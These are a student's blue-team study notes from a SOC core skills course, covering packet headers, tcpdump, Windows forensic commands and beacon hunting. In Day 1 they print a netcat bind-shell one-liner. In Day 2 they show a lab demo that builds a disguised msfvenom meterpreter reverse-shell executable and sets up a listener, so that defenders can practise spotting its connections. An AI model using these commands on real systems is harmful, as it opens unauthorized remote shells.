---
{"dg-publish":true,"permalink":"/cards/blue-team/siem/soc-core-skills/"}
---

[[map-of-contents/blue-team\|blue-team]]
- Don't wait for an incident to try tools you have read about.
- How we are going to tell apart the True Positive from the False Positive?
	- Simple: Ask the user but in most mature organization, a change that can trigger alert has to go **Change Request** process first.
	- Context and correlation is key.

## Day 1

![[cards/blue-team/siem/image/SOC Core Skills.png\|cards/blue-team/siem/image/SOC Core Skills.png]]
- **Identification** - used to identify chopped packets for re-assembling (Same IP ID).
	- 16 bit - there is 65,536 possible IP-ID values for chopped packets.
- **IP Flags** - 
	- D - Don't fragment this packet.
	- M - More fragment means more fragments are coming (if M does not exist it means it is the last).
	- X - (a troll) known as _evil bit_ hackers must flip the value to 1 that means this packet is malicious.

Right below (think about this as a layer) this is either a TCP Header or UDP Header:
![SOC Core Skills-1.png](/img/user/cards/blue-team/siem/images/SOC%20Core%20Skills-1.png)
- **src and dst port** - we can think about them as rooms in a hotel where hotel is the  destination address and the **rooms are services in your computer** while we are the customers (src address).
- **sequence numbers** - are similar to pages in a book - you receive random pages not starting to page 1 but this is okay as you can easily reassemble it using the page numbers.
- **Acknowledgement Number** - the next sequence of number the sender is expecting to receive.
- **TCP Flags**
	- ACK - constantly acknowledging what has been sent and received by incrementing by 1 or number of bytes received to the sequence number.
	- RST - something went wrong reset start from scratch.
	- SYN - start with synchronization or communication.
	- FIN - that is it comms is over.
	- After communication has been succesfully established it is more ACK ACK ACK.

![SOC Core Skills.png](/img/user/cards/blue-team/siem/images/SOC%20Core%20Skills.png)


```
tcpdump -AX -l lo
```

- Snips traffic on loopback interface.
- `-AX` shows the ASCII and the hexdump of packets.

![SOC Core Skills-2.png](/img/user/cards/blue-team/siem/images/SOC%20Core%20Skills-2.png)

```bash
tcpdump -n -r file
```

- `-n` don't resolve hostname
- tshark is now much preferred - [[cards/blue-team/network-security/TShark\|TShark]]
- TCP/IP model > OSI model - search for steven's four layer model
- For finding malware or any interesting conversation - use the statistics and conversation to find the top "talker" on your endpoint.
	- Then right click and apply as filter to see what they are talking about.
- Statistics - HTTP - request is a must see

 a great reference by professor messer on tcpdump https://danielmiessler.com/p/tcpdump/

An interesting malware:
`mknod backpipe p`

```
/bin/bash 0<backpipe | nc -l 2222 1>backpipe
```

Input from `netcat` is passed around backpipe and then outputted to `bash` and then the output of the command `bash` will be passed around netcat. Think about like when you shake a box with water, it goes from one side to another back and forth.

Think about similar to a reverse shell and a great **reverse engineering a must try at the bottom**:

https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/Tools/IntroClass/LinuxCLI/LinuxCLI.md

## Day 2

###### Windows Forensics
- Start with network connections and then work backwards. WHY because there are fewer network connections than processes to cut through.
- Get your baseline.
- Check processes on a system that is not infected first.
- FOCUS on established and start researching the IPs.


- `net view \\127.0.0.1` - attackers likes to create a _beach head_ when they intially compromised a system, it is a technique (usually network shares) to allow attackers access files for lateral movement or data exfiltration.
	- Get the baseline - what share is normal what is not?
- `net session` - checks who is talking to our system.
- `net use` - what system our current device talking to.
- `netstat -anob` - shows network connections with associated PID and proces name.
	- `-a` display active TCP connections and shows TCP and UDP ports that the computer is listening.
	- `-n` display active TCP connections but no name resolutions.
	- `-o` display active TCP connections including PID.
	- `-b` display the executable involved in creating each connections or listening port.
	- `-f` resolves port and address.
- `tasklist /svc` - shows image name, pid and their services.
	- `svchost.exe` is a service that starts other services.
	- `/V` shows image, pid and `.dll` loaded.
	- `/m /fi "pid eq 4444"` 
	- `/m mtdll.dll`

![SOC Core Skills-3.png](/img/user/cards/blue-team/siem/images/SOC%20Core%20Skills-3.png)

- `wmic process get name,parentprocessid,processid`

![SOC Core Skills-4.png](/img/user/cards/blue-team/siem/images/SOC%20Core%20Skills-4.png)
#### Demonstrations
---
Creating a malware then pass it to Windows via curl:

```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 -f exe -o /tmp/TrustMe.exe
```

1. `msfconsole -q`
2. `use exploit/multi/handler`
3. `set PAYLOAD windows/meterpreter/reverse_tcp`
4. `set LHOST 10.200.200.7`
5. `exploit`
6. Run the .exe on Windows.

`netstat -naob`:

![SOC Core Skills-5.png](/img/user/cards/blue-team/siem/images/SOC%20Core%20Skills-5.png)

using `wmic` command:

![SOC Core Skills-6.png](/img/user/cards/blue-team/siem/images/SOC%20Core%20Skills-6.png)

- https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/Tools/IntroClass/WindowsCLI/WindowsCLI.md - reference
- deepbluecli - have a look


SOME AD attacks & defend - https://www.youtube.com/watch?v=rSgj-oMxG0g

WINDOWS FORENSICS - https://www.youtube.com/watch?v=7Z-Su-jkUnQ

## Day 3

- **Beacons** - some backdoors have a very strong “heartbeat”. This is where a backdoor will constantly reconnect to get commands from an attacker at a specific interval
- Server logs then check the IP address in tools such IP database but attackers can bounce off traffic to CDNs known as **domain fronting**.
- The use of tools/wisdom to get to the top of the pyramid - _data knowledge information pyramid_.
	- When looking for something it is a good idea to consult the _CIS benchmark_. A lot of times a.k.a the manual.
	- ![SOC Core Skills-7.png](/img/user/cards/blue-team/siem/images/SOC%20Core%20Skills-7.png) hit it with nessus or NUCLI much preferred and watch the logs.
	- use vendor hardening guide, or any third paty source for securing the app.
	- IT'S TIME TO DIG DEEP!
	- builtwith website to know what company is builtwith. FULL RECON,
		- site: risebroadband.com 
		- remove `- www` to see somethind different. (Discovered ADFS tool - now we can use this to our advantage in interviews)
		- Then remove `adfs` look it up and say be **familiar** with adfs - familiar and how to secure them.
		- look for closed connections on memory analysis.
	- If you see file explorer.exe as the one who runs an image it means a user clicks it.
- zeek for network analysis.
	- Due to encoding, obsfucation - we should rely on **context**. and not on signature based this makes zeek good.
	- But what about intervals? attackers could connect or perform their malicious activities in small, medium, large intervals - then it would be tough unlike brute-forcing where in it's 0.5 ms to 1 second.
		- The key is put it in a **course of a day** then add up the amount:  

![SOC Core Skills-8.png](/img/user/cards/blue-team/siem/images/SOC%20Core%20Skills-8.png)
- But what about normal services that does this such as Google or Microsoft?
	- rita allows us to write a whitelist and then we can look at the number of connections then compare it backwards: (zeek then feed it to rita).

![SOC Core Skills-9.png](/img/user/cards/blue-team/siem/images/SOC%20Core%20Skills-9.png)
- There is no "False Positives" it's a tuning problem.
- Do research on UABA

![SOC Core Skills-10.png](/img/user/cards/blue-team/siem/images/SOC%20Core%20Skills-10.png)

alexaj

## Day 4

- Properly Powershell and command line logging.
- Bluespawn is a great (non-production) EDR - it has monitor mode which means don't block it let me see it.
- Evaluate EDR with Atomic Red Team.
- In vulnerability management think about focusing on vulnerabilities found on multiple systems not focusing on vulnerabilities found on IP addresses and ranges (grouping) then address vulnerabilities on automated fashion.
- Pentest web apps regularly test them - nikto, Automatic Web Security Scanner (W3AF), and Zed Attack Proxy
